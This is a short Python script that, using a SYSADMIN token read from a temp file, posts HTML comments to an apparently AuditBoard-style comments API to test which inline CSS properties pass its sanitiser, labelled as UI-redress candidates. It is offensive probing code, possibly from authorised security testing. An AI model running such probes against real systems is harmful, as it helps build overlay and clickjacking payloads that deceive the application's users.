import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(html):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,"message_raw":html,"message_html":html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXU'+uuid.uuid4().hex[:5]
print("=== which CSS properties survive? (UI-redress candidates) ===")
props=[
 ('position',      'position:absolute;top:0;left:0'),
 ('z-index',       'z-index:99999'),
 ('opacity',       'opacity:0'),
 ('transform',     'transform:translateX(500px)'),
 ('display',       'display:block'),
 ('visibility',    'visibility:hidden'),
 ('overflow',      'overflow:hidden'),
 ('pointer-events','pointer-events:none'),
 ('mix-blend',     'mix-blend-mode:difference'),
 ('clip-path',     'clip-path:circle(0)'),
 ('filter',        'filter:blur(5px)'),
 ('content',       'content:"x"'),
 ('margin',        'margin:-500px'),
 ('width-huge',    'width:9999px;height:9999px'),
]
for label,style in props:
    h=f'<div style="{style}">ZX{tag}</div>'
    c,b=post(h)
    st=''
    if c in ('200','201'):
        try: st=repr(json.loads(b)['comments'][0].get('message_html'))[:90]
        except: pass
    survived = style.split(':')[0] in st if st else False
    print(f"  {label:14} {c:>4}  {'SURVIVED' if survived else 'stripped'}  {st[:80]}")
